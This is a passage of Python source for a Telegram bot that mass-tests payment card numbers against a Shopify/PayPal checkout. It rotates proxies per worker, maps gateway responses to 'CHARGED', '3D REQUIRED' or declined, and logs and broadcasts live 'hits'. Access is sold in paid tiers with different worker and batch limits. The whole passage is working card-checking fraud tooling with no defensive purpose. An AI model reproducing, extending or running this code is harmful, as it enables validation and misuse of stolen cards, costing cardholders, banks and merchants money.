        # Remove any protocol prefixes
        proxy = re.sub(r'^(http|https|socks4|socks5)://', '', proxy)
        
        # Format 1: Already correct - user:pass@host:port
        if '@' in proxy:
            auth, hostport = proxy.split('@', 1)
            if ':' in auth and ':' in hostport:
                return proxy
        
        # Format 2: host:port:user:pass
        parts = proxy.split(':')
        if len(parts) == 4:
            # Check if second part is port (digits) -> host:port:user:pass
            if parts[1].isdigit():
                host, port, user, password = parts
                return f"{host}:{port}:{user}:{password}"
            # Otherwise it might be user:pass:host:port
            else:
                user, password, host, port = parts
                if port.isdigit():
                    return f"{host}:{port}:{user}:{password}"
        
        # Format 3: host:port only
        if len(parts) == 2 and parts[1].isdigit():
            return proxy
        
        # Try generic formatter
        formatted = format_proxy(proxy)
        if formatted:
            # Remove protocol
            clean = formatted.replace('http://', '').replace('https://', '')
            return clean
        
        print(f"⚠️ [Shopify Mass Proxy] Could not parse: {original_proxy[:50]}...")
        return None
        
    except Exception as e:
        print(f"⚠️ [Shopify Mass Proxy] Error: {e}")
        return None


def format_shopify_mass_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Shopify Mass API response for display"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    response_msg = result.get("message", "Unknown")
    price = result.get("price", "0.00")
    elapsed = result.get("elapsed", 0)
    gateway = result.get("gateway", "Shopify Payments")
    proxy_used = result.get("proxy_used", "None")
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    try:
        price_float = float(price)
        price_str = f"${price_float:.2f}"
    except:
        price_str = f"${price}"
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price_str}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category


        
# ============ MSH (SHOPIFY) WORKER CONFIGURATION ============
MSH_WORKER_CONFIG = {
    "free": {"workers": 1, "delay": 2.0, "concurrency": 1},
    "premium": {"workers": 1, "delay": 1.5, "concurrency": 1},
    "ultimate": {"workers": 1, "delay": 1.0, "concurrency": 1},
    "admin": {"workers": 1, "delay": 0.8, "concurrency": 1}
}



# ============ MSH WORKER MODE FOR MASS CHECKS ============

async def msh_worker_check_card(card: str, amount: str, currency: str, proxy: str = None, user_id: int = None, worker_id: int = None) -> Dict:
    """
    Individual card check for MSH worker mode
    Each worker handles its own checkout independently
    """
    print(f"\n{'='*60}")
    print(f"👷 [WORKER #{worker_id}] Processing card: {card[:20]}...")
    if proxy:
        print(f"🔌 [WORKER #{worker_id}] Using proxy: {mask_proxy(proxy)}")
    print(f"{'='*60}")
    
    try:
        # Parse card
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format",
                "status_display": "⚠️ INVALID",
                "status_category": "error",
                "worker_id": worker_id
            }
        
        card_num, card_mm, card_yy, card_cvv = parts
        
        # Format year
        if len(card_yy) == 4:
            card_yy = card_yy[2:]
        
        start_time = time.time()
        
        # Get proxy if allowed
        proxy_str = None
        if proxy:
            proxy_str = proxy
        
        # Use PayPal API internally (same as /sh)
        result = await check_card_paypal(card, amount, currency, proxy_str, user_id)
        
        elapsed = time.time() - start_time
        
        if result:
            response_text = result.get("message", "UNKNOWN")
            status_category = result.get("status_category", "unknown")
            result_status = result.get("result", "")
            result_code = result.get("code", "")
            
            response_upper = response_text.upper()
            code_upper = result_code.upper()
            
            # ============ UPDATED: Map ALL working responses to CHARGED ============
            # These all indicate the card is valid/working - should show as CHARGED
            charged_patterns = [
                "CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID", "COMPLETED",
                "RISK_DISALLOWED", "RISK", "DISALLOWED", 
                "EXISTING_ACCOUNT_RESTRICTED", "APPROVED - AVS",
                "EXISTING", "ACCOUNT", "RESTRICTED", "INSUFFICIENT", "FUNDS",
                "CVV LIVE", "APPROVED"
            ]
            
            # 3D/OTP patterns (still show as 3D REQUIRED)
            otp_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS", "THREEDS"]
            
            # Check if it's a CHARGED/APPROVED response
            is_charged = any(p in response_upper for p in charged_patterns) or any(p in code_upper for p in charged_patterns)
            
            # Check if it's 3D/OTP required
            is_otp = any(p in response_upper for p in otp_patterns)
            
            # Check for specific response codes
            if result_code and result_code.upper() == "RISK_DISALLOWED":
                is_charged = True
                print(f"🎯 [WORKER #{worker_id}] RISK_DISALLOWED detected - Card is LIVE! Treating as CHARGED")
            
            if result_code and result_code.upper() == "EXISTING_ACCOUNT_RESTRICTED":
                is_charged = True
                print(f"🎯 [WORKER #{worker_id}] EXISTING_ACCOUNT_RESTRICTED detected - Card is LIVE! Treating as CHARGED")
            
            # Check for insufficient funds (still a live card)
            if "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                is_charged = True
                print(f"💰 [WORKER #{worker_id}] INSUFFICIENT FUNDS - Card is live but has no balance")
            
            if is_charged:
                # All working cards show as CHARGED with Shopify format
                status_display = "🔥 CHARGED 🔥"
                status_category_final = "charged"
                if "RISK_DISALLOWED" in response_upper or "RISK_DISALLOWED" in code_upper:
                    response_msg = "RISK_DISALLOWED - Card is valid (risk flagged)"
                elif "EXISTING_ACCOUNT_RESTRICTED" in response_upper or "EXISTING_ACCOUNT_RESTRICTED" in code_upper:
                    response_msg = "EXISTING_ACCOUNT_RESTRICTED - Card is LIVE"
                elif "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                    response_msg = "INSUFFICIENT FUNDS - Card has balance issue"
                else:
                    response_msg = "Order completed 💎"
                print(f"🔥 [WORKER #{worker_id}] CHARGED: {card[:20]}...")
                
            elif is_otp:
                status_display = "🔐 3D REQUIRED"
                status_category_final = "approved"
                response_msg = "3D Secure required - Authentication needed"
                print(f"🔐 [WORKER #{worker_id}] 3D REQUIRED: {card[:20]}...")
                
            else:
                status_display = "❌ DECLINED"
                status_category_final = "declined"
                response_msg = "CARD DECLINED"
                print(f"❌ [WORKER #{worker_id}] DECLINED: {card[:20]}...")
            
            return {
                "status": "success" if status_category_final in ["charged", "approved"] else "declined",
                "result": status_display,
                "message": response_msg,
                "raw_response": response_text,
                "status_display": status_display,
                "status_category": status_category_final,
                "elapsed": elapsed,
                "price": f"${amount}",
                "gateway": "Shopify Payments",
                "proxy_used": proxy_str,
                "worker_id": worker_id,
                "code": result_code
            }
        else:
            print(f"❌ [WORKER #{worker_id}] No response from API")
            return {
                "status": "error",
                "result": "ERROR",
                "message": "No response from API",
                "status_display": "⚠️ ERROR",
                "status_category": "error",
                "elapsed": elapsed,
                "worker_id": worker_id
            }
            
    except Exception as e:
        print(f"❌ [WORKER #{worker_id}] Error: {e}")
        return {
            "status": "error",
            "result": "ERROR",
            "message": str(e)[:100],
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "worker_id": worker_id
        }


async def msh_single_worker(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                            card_queue: asyncio.Queue, worker_id: int, 
                            stats: dict, results_lock: asyncio.Lock,
                            amount: str, currency: str, user_id: int,
                            progress_msg, total_cards: int):
    """
    Single worker that processes cards one by one from the queue
    Each worker handles its own checkout independently
    """
    message = update.effective_message
    
    while True:
        try:
            # Get card from queue with timeout
            card = await asyncio.wait_for(card_queue.get(), timeout=1.0)
        except asyncio.TimeoutError:
            # No more cards, worker exits
            break
        
        try:
            # Get proxy for this worker (rotating per worker)
            proxy_str = None
            if user_manager.can_use_proxy(user_id):
                proxy_str = get_rotating_proxy_for_user(user_id, f'msh_worker_{worker_id}')
            
            # Process the card
            result = await msh_worker_check_card(card, amount, currency, proxy_str, user_id, worker_id)
            
            # Get BIN info
            bin_info = await get_bin_info(card)
            bin_info_text, bank, country, currency_code, country_code = bin_info
            
            # Format response
            status_display = result.get("status_display", "❌ DECLINED")
            status_category = result.get("status_category", "declined")
            response_msg = result.get("message", "CARD DECLINED")
            price_str = result.get("price", f"${amount}")
            elapsed = result.get("elapsed", 0)
            
            ui = (
                f"┏━━━━━━━⍟\n"
                f"┃ {status_display}\n"
                f"┗━━━━━━━━━━━⊛\n\n"
                f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
                f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Shopify Payments\n"
                f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
                f"[⌬] 𝐏𝐫𝐢𝐜𝐞 ↣ {price_str}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
                f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
                f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"[⌬] 𝐖𝐨𝐫𝐤𝐞𝐫 ↣ #{worker_id}\n"
                f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
            )
            
            # Update stats
            async with results_lock:
                if status_category == "charged":
                    stats["charged"] += 1
                    # ============ FIXED: Send result for charged cards ============
                    try:
                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
                        print(f"📤 [WORKER #{worker_id}] Sent CHARGED result for card: {card[:20]}...")
                    except Exception as e:
                        print(f"❌ [WORKER #{worker_id}] Error sending charged message: {e}")
                    
                    # Save hit
                    await save_hit_to_file(
                        card=card,
                        gateway="Shopify Payments",
                        response=response_msg,
                        price=price_str,
                        bin_info=bin_info,
                        user_id=user_id,
                        user_tier=user_manager.get_tier(user_id)
                    )
                    
                    # Send notification
                    user_data = user_manager.get_user(user_id)
                    await send_hit_notification(
                        context=context,
                        gateway="Shopify Payments",
                        card=card,
                        response=response_msg,
                        price=price_str,
                        user=user_data,
                        bin_info=bin_info,
                        status_category="charged"
                    )
                    
                    user_manager.increment_hits(user_id)
                    
                elif status_category == "approved":
                    stats["approved"] += 1
                    # ============ FIXED: Send result for approved cards (3D/Insufficient) ============
                    try:
                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
                        print(f"📤 [WORKER #{worker_id}] Sent APPROVED result for card: {card[:20]}...")
                    except Exception as e:
                        print(f"❌ [WORKER #{worker_id}] Error sending approved message: {e}")
                    
                    await save_hit_to_file(
                        card=card,
                        gateway="Shopify Payments",
                        response=response_msg,
                        price=price_str,
                        bin_info=bin_info,
                        user_id=user_id,
                        user_tier=user_manager.get_tier(user_id)
                    )
                    
                    user_manager.increment_hits(user_id)
                    
                elif status_category == "declined":
                    stats["declined"] += 1
                    # Don't send declined results (optional - uncomment if you want to send)
                    # await message.reply_text(ui, parse_mode=ParseMode.HTML)
                    print(f"🔇 [WORKER #{worker_id}] Declined (silent): {card[:20]}...")
                    
                else:
                    stats["errors"] += 1
                    print(f"⚠️ [WORKER #{worker_id}] Error (silent): {card[:20]}...")
                
                stats["processed"] += 1
                
                # Update progress every 5 cards
                if stats["processed"] % 5 == 0 or stats["processed"] == total_cards:
                    await update_progress_buttons(
                        context, message.chat_id, progress_msg.message_id,
                        stats["processed"], total_cards,
                        stats["charged"] + stats["approved"],
                        stats["declined"],
                        f"Worker #{worker_id}",
                        f"Processing..."
                    )
            
            user_manager.increment_checks(user_id, 1)
            
            # Delay between cards for this worker
            config = MSH_WORKER_CONFIG.get(user_manager.get_tier(user_id), MSH_WORKER_CONFIG["free"])
            await asyncio.sleep(config["delay"])
            
        except Exception as e:
            print(f"❌ [WORKER #{worker_id}] Error processing card: {e}")
            async with results_lock:
                stats["errors"] += 1
                stats["processed"] += 1
        finally:
            card_queue.task_done()
    
    print(f"👷 [WORKER #{worker_id}] Finished")
    
async def shopify_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Mass check logic for Shopify gateway (using PayPal API internally) - FIXED for multi-user"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [SHOPIFY MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"{'='*80}")
    
    try:
        shopify_active_tasks[u_id] = True
        tier = user_manager.get_tier(u_id)
        
        # Get amount from user settings
        amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
        currency = context.user_data.get('payment_currency', DEFAULT_CURRENCY)
        
        # Concurrency based on tier
        CONCURRENCY = {
            "free": 1,
            "premium": 1,
            "ultimate": 3,
            "admin": 2
        }.get(tier, 1)
        
        stats = {
            "charged": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "total": total,
            "processed": 0
        }
        
        start_time = time.time()
        
        if progress_msg is None:
            progress_msg = await message.reply_text(
                f"🔄 <b>Shopify Mass Check Started</b>\n\n"
                f"📝 Cards: {total}\n"
                f"🔀 Parallel: {CONCURRENCY}\n"
                f"💰 Amount: ${amount}\n"
                f"🔄 Starting...",
                parse_mode=ParseMode.HTML,
                reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting...")
            )
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        results_lock = asyncio.Lock()
        processed_count = 0
        
        async def process_card(card: str, idx: int):
            nonlocal processed_count
            
            async with semaphore:
                # Get proxy if allowed
                proxy_str = None
                if user_manager.can_use_proxy(u_id):
                    proxy_str = get_proxy_for_user(u_id, 'paypal')
                
                start_time_card = time.time()
                
                # Use PayPal API internally
                result = await check_card_paypal(card, amount, currency, proxy_str, u_id)
                
                elapsed = time.time() - start_time_card
                
                async with results_lock:
                    processed_count += 1
                    if processed_count % 5 == 0 or processed_count == total:
                        await update_progress_buttons(
                            context, message.chat_id, progress_msg.message_id,
                            processed_count, total,
                            stats["charged"] + stats["approved"],
                            stats["declined"],
                            f"{processed_count}/{total}",
                            f"Processing..."
                        )
                    
                    # ============ CRITICAL FIX: Yield control to other users ============
                    await asyncio.sleep(0)
                
                return idx, result, card, elapsed
        
        # Process all cards
        tasks = [process_card(card, i) for i, card in enumerate(cards)]
        
        # ============ CRITICAL FIX: Use asyncio.gather with proper concurrency ============
        # Instead of as_completed which can block, use gather with a semaphore
        for i in range(0, len(tasks), CONCURRENCY):
            if u_id not in shopify_active_tasks:
                break
            
            chunk = tasks[i:i+CONCURRENCY]
            try:
                chunk_results = await asyncio.gather(*chunk, return_exceptions=True)
                
                for item in chunk_results:
                    if u_id not in shopify_active_tasks:
                        break
                    
                    if isinstance(item, Exception):
                        async with results_lock:
                            stats["errors"] += 1
                        continue
                    
                    idx, result, card, elapsed = item
                    if not result or not card:
                        continue
                    
                    # Process result (same as before)
                    bin_info = await get_bin_info(card)
                    bin_info_text, bank, country, currency_code, country_code = bin_info
                    
                    if result:
                        response_text = result.get("message", "UNKNOWN")
                        status_category = result.get("status_category", "unknown")
                        result_status = result.get("result", "")
                        result_code = result.get("code", "")
                        
                        response_upper = response_text.upper()
                        code_upper = result_code.upper()
                        
                        # Charged patterns
                        charged_patterns = [
                            "CHARGED", "ORDER COMPLETED", "PAID", "COMPLETED",
                            "RISK_DISALLOWED", "RISK", 
                        ]
                        
                        otp_patterns = ["OTP", "3D", "SECURE", "EXISTING_ACCOUNT_RESTRICTED", "AUTHENTICATION", "3DS"]
                        
                        is_charged = any(p in response_upper for p in charged_patterns) or any(p in code_upper for p in charged_patterns)
                        is_otp = any(p in response_upper for p in otp_patterns)
                        
                        if is_charged:
                            status_display = "🔥 CHARGED 🔥"
                            status_category_final = "charged"
                            response_msg = "Order completed 💎"
                            async with results_lock:
                                stats["charged"] += 1
                            print(f"🔥 [SHOPIFY MASS] CHARGED detected for card: {card[:20]}...")
                            
                        elif is_otp:
                            status_display = "🔐 3D REQUIRED"
                            status_category_final = "approved"
                            response_msg = "OTP_REQUIRED - 3D Secure needed"
                            async with results_lock:
                                stats["approved"] += 1
                            print(f"🔐 [SHOPIFY MASS] 3D REQUIRED for card: {card[:20]}...")
                            
                        elif "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                            status_display = "💰 INSUFFICIENT FUNDS"
                            status_category_final = "approved"
                            response_msg = "INSUFFICIENT FUNDS - Card has balance issue"
                            async with results_lock:
                                stats["approved"] += 1
                            print(f"💰 [SHOPIFY MASS] INSUFFICIENT FUNDS for card: {card[:20]}...")
                            
                        else:
                            status_display = "❌ DECLINED"
                            status_category_final = "declined"
                            response_msg = "CARD DECLINED"
                            async with results_lock:
                                stats["declined"] += 1
                        
                        try:
                            price_float = float(amount)
                            price_str = f"${price_float:.2f}"
                        except:
                            price_str = f"${amount}"
                        
                        if status_category_final in ["charged", "approved"]:
                            ui = (
                                f"┏━━━━━━━⍟\n"
                                f"┃ {status_display}\n"
                                f"┗━━━━━━━━━━━⊛\n\n"
                                f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
                                f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Shopify Payments\n"
                                f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
                                f"[⌬] 𝐏𝐫𝐢𝐜𝐞 ↣ {price_str}\n"
                                f"━━━━━━━━━━━━━━━━━━━\n"
                                f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
                                f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
                                f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
                                f"━━━━━━━━━━━━━━━━━━━"
                            )
                            
                            try:
                                await message.reply_text(ui, parse_mode=ParseMode.HTML)
                            except Exception as e:
                                print(f"❌ [SHOPIFY MASS] Error sending message: {e}")
                            
                            await save_hit_to_file(
                                card=card,
                                gateway="Shopify Payments",
                                response=response_msg,
                                price=price_str,
                                bin_info=bin_info,
                                user_id=u_id,
                                user_tier=tier
                            )
                            
                            if status_category_final == "charged":
                                user_data = user_manager.get_user(u_id)
                                await send_hit_notification(
                                    context=context,
                                    gateway="Shopify Payments",
                                    card=card,
                                    response=response_msg,
                                    price=price_str,
                                    user=user_data,
                                    bin_info=bin_info,
                                    status_category="charged"
                                )
                            
                            user_manager.increment_hits(u_id)
                    
                    user_manager.increment_checks(u_id, 1)
                    
                    # ============ CRITICAL FIX: Yield control after each card ============
                    await asyncio.sleep(0)
                    
            except asyncio.TimeoutError:
                print(f"⚠️ Chunk timeout for user {u_id}")
                continue
        
        if u_id in shopify_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            
            summary = (
                f"🏁 <b>Shopify Mass Check Complete</b>\n\n"
                f"🔥 Charged: {stats['charged']}\n"
                f"🔐 3D/OTP: {stats['approved']}\n"
                f"❌ Declined: {stats['declined']}\n"
                f"⚠️ Errors: {stats['errors']}\n"
                f"📝 Total: {total}\n"
                f"⏱️ Time: {minutes}m {seconds}s"
            )
            
            await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        
        return stats
        
    except Exception as e:
        print(f"❌ Shopify mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            else:
                await message.reply_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        shopify_active_tasks.pop(u_id, None)


async def msh_mass_check_worker_mode(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    """
    MSH Mass check with worker mode - NON-BLOCKING version
    Runs in a separate thread to not block other users
    """
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    # Check if user already has a running mass check
    if u_id in running_mass_checks:
        await message.reply_text("⚠️ You already have a mass check running. Please wait or use /stop")
        return
    
    # Get user tier and worker config
    tier = user_manager.get_tier(u_id)
    config = MSH_WORKER_CONFIG.get(tier, MSH_WORKER_CONFIG["free"])
    worker_count = config["workers"]
    
    print(f"\n{'='*80}")
    print(f"👷 [MSH WORKER MODE] Starting batch for user {u_id} (NON-BLOCKING)")
    print(f"📊 Total cards: {total}")
    print(f"👥 Workers: {worker_count}")
    print(f"🎯 Tier: {tier.upper()}")
    print(f"{'='*80}")
    
    # Check if user can mass check
    if not user_manager.can_mass_check(u_id):
        await message.reply_text(
            f"❌ <b>Mass Check Not Available for {tier.upper()} Tier</b>\n\n"
            f"Your tier ({tier.upper()}) only supports single card checks.\n\n"
            f"Use <code>/sh &lt;card&gt;</code> for single checks.\n\n"
            f"💎 Upgrade to Premium/Ultimate for mass checks with worker mode.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check user access
    if not user_manager.can_access_gateway(u_id, 'paypal'):
        await message.reply_text("❌ Your tier doesn't have access to this gateway.")
        return
    
    # Check batch size limit
    max_batch = user_manager.get_max_batch_size(u_id)
    if len(cards) > max_batch:
        cards = cards[:max_batch]
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        total = len(cards)
    
    amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
    currency = context.user_data.get('payment_currency', DEFAULT_CURRENCY)
    
    # Create progress message
    progress_msg = await message.reply_text(
        f"👷 <b>MSH Active</b>\n\n"
        f"🎯 Tier: {tier.upper()}\n"
        f"👥 Workers: {worker_count}\n"
        f"📝 Cards: {total}\n"
        f"💰 Amount: ${amount}\n"
        f"🔄 Starting {worker_count} workers...\n\n"
        f"<i>Other users can still use the bot while this runs</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting workers...")
    )
    
    # Mark as running
    running_mass_checks[u_id] = True
    shopify_active_tasks[u_id] = True
    
    # Run the mass check in a separate thread to avoid blocking
    def run_mass_check_sync():
        """Synchronous version that runs in thread pool"""
        return asyncio.run(_msh_mass_check_sync(
            update, context, cards, amount, currency, 
            tier, worker_count, total, u_id, progress_msg.message_id
        ))
    
    # Start the mass check in thread pool (non-blocking)
    loop = asyncio.get_event_loop()
    asyncio.create_task(_run_mass_check_in_background(
        loop, update, context, cards, amount, currency,
        tier, worker_count, total, u_id, progress_msg
    ))


async def _run_mass_check_in_background(loop, update, context, cards, amount, currency,
                                         tier, worker_count, total, u_id, progress_msg):
    """Run mass check in background without blocking the main event loop"""
    try:
        # Create a new event loop for this thread or use existing
        result = await _msh_mass_check_sync(
            update, context, cards, amount, currency,
            tier, worker_count, total, u_id, progress_msg.message_id
        )
    except Exception as e:
        print(f"❌ Background mass check error for user {u_id}: {e}")
        traceback.print_exc()
        try:
            await progress_msg.edit_text(f"❌ Error in mass check: {str(e)[:100]}")
        except:
            pass
    finally:
        running_mass_checks.pop(u_id, None)
        shopify_active_tasks.pop(u_id, None)


async def _msh_mass_check_sync(update, context, cards, amount, currency,
                                tier, worker_count, total, u_id, progress_msg_id):
    """Actual mass check logic - runs in thread pool"""
    message = update.effective_message
    chat_id = update.effective_chat.id
    
    stats = {
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "errors": 0,
        "processed": 0,
        "total": total
    }
    results_lock = asyncio.Lock()
    
    start_time = time.time()
    
    # Create queue with all cards
    card_queue = asyncio.Queue()
    for card in cards:
        await card_queue.put(card)
    
    # Create and start workers
    workers = []
    for i in range(worker_count):
        worker = asyncio.create_task(
            _msh_single_worker_background(
                chat_id, progress_msg_id, context, card_queue, i + 1,
                stats, results_lock, amount, currency, u_id, total
            )
        )
        workers.append(worker)
    
    # Wait for all workers to complete with periodic yielding
    while workers:
        # Check if session was stopped
        if u_id not in shopify_active_tasks or u_id not in running_mass_checks:
            # Cancel all workers
            for w in workers:
                w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
            break
        
        # Wait for any worker to complete or timeout
        done, pending = await asyncio.wait(workers, timeout=1.0, return_when=asyncio.FIRST_COMPLETED)
        workers = list(pending)
        
        # Yield control to event loop to process other users
        await asyncio.sleep(0)
    
    # Final summary (only if not stopped)
    if u_id in shopify_active_tasks and u_id in running_mass_checks:
        total_time = time.time() - start_time
        minutes = int(total_time // 60)
        seconds = int(total_time % 60)
        
        summary = (
            f"🏁 <b>MSH Mode Complete</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🔥 Charged: {stats['charged']}\n"
            f"✅ Approved: {stats['approved']}\n"
            f"❌ Declined: {stats['declined']}\n"
            f"⚠️ Errors: {stats['errors']}\n"
            f"📝 Total: {stats['total']}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"⏱️ Time: {minutes}m {seconds}s"
        )
        
        try:
            await context.bot.edit_message_text(
                text=summary,
                chat_id=chat_id,
                message_id=progress_msg_id,
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            print(f"❌ Error updating progress message: {e}")
    
    return stats


async def _msh_single_worker_background(chat_id, progress_msg_id, context, card_queue, worker_id,
                                         stats, results_lock, amount, currency, user_id, total_cards):
    """Single worker that processes cards - yields control frequently"""
    
    while True:
        try:
            # Get card from queue with short timeout to allow checking stop signal
            try:
                card = await asyncio.wait_for(card_queue.get(), timeout=0.5)
            except asyncio.TimeoutError:
                # No more cards, check if we should exit
                if card_queue.empty():
                    break
                continue
            
            # Check if session was stopped (check via user_id in active tasks)
            if user_id not in shopify_active_tasks or user_id not in running_mass_checks:
                card_queue.task_done()
                break
            
            # Get proxy for this worker
            proxy_str = None
            if user_manager.can_use_proxy(user_id):
                proxy_str = get_rotating_proxy_for_user(user_id, f'msh_worker_{worker_id}')
            
            # Process the card
            result = await msh_worker_check_card(card, amount, currency, proxy_str, user_id, worker_id)
            
            # Get BIN info
            bin_info = await get_bin_info(card)
            bin_info_text, bank, country, currency_code, country_code = bin_info
            
            # Format response
            status_display = result.get("status_display", "❌ DECLINED")
            status_category = result.get("status_category", "declined")
            response_msg = result.get("message", "CARD DECLINED")
            price_str = result.get("price", f"${amount}")
            elapsed = result.get("elapsed", 0)
            
            ui = (
                f"┏━━━━━━━⍟\n"
                f"┃ {status_display}\n"
                f"┗━━━━━━━━━━━⊛\n\n"
                f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
                f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Shopify Payments\n"
                f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
                f"[⌬] 𝐏𝐫𝐢𝐜𝐞 ↣ {price_str}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
                f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
                f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"[⌬] 𝐖𝐨𝐫𝐤𝐞𝐫 ↣ #{worker_id}\n"
                f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
            )
            
            # Update stats
            async with results_lock:
                if status_category == "charged":
                    stats["charged"] += 1
                    # Send result via bot (non-blocking)
                    try:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=ui,
                            parse_mode=ParseMode.HTML
                        )
                    except Exception as e:
                        print(f"❌ Error sending message: {e}")
                    
                    # Save hit
                    await save_hit_to_file(
                        card=card,
                        gateway="Shopify Payments",
                        response=response_msg,
                        price=price_str,
                        bin_info=bin_info,
                        user_id=user_id,
                        user_tier=user_manager.get_tier(user_id)
                    )
                    
                    # Send notification
                    user_data = user_manager.get_user(user_id)
                    await send_hit_notification(
                        context=context,
                        gateway="Shopify Payments",
                        card=card,
                        response=response_msg,
                        price=price_str,
                        user=user_data,
                        bin_info=bin_info,
                        status_category="charged"
                    )
                    
                    user_manager.increment_hits(user_id)
                    
                elif status_category == "approved":
                    stats["approved"] += 1
                    try:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=ui,
                            parse_mode=ParseMode.HTML
                        )
                    except Exception as e:
                        print(f"❌ Error sending message: {e}")
                    
                    await save_hit_to_file(
                        card=card,
                        gateway="Shopify Payments",
                        response=response_msg,
                        price=price_str,
                        bin_info=bin_info,
                        user_id=user_id,
                        user_tier=user_manager.get_tier(user_id)
                    )
                    
                    user_manager.increment_hits(user_id)
                    
                elif status_category == "declined":
                    stats["declined"] += 1
                    # Silent
                    
                else:
                    stats["errors"] += 1
                
                stats["processed"] += 1
                
                # Update progress every 5 cards
                if stats["processed"] % 5 == 0 or stats["processed"] == total_cards:
                    try:
                        await context.bot.edit_message_reply_markup(
                            chat_id=chat_id,
                            message_id=progress_msg_id,
                            reply_markup=create_progress_buttons(
                                stats["processed"], total_cards,
                                stats["charged"] + stats["approved"],
                                stats["declined"],
                                f"Worker #{worker_id}",
                                f"Processing..."
                            )
                        )
                    except Exception as e:
                        pass
            
            user_manager.increment_checks(user_id, 1)
            
            # Delay between cards
            config = MSH_WORKER_CONFIG.get(user_manager.get_tier(user_id), MSH_WORKER_CONFIG["free"])
            await asyncio.sleep(config["delay"])
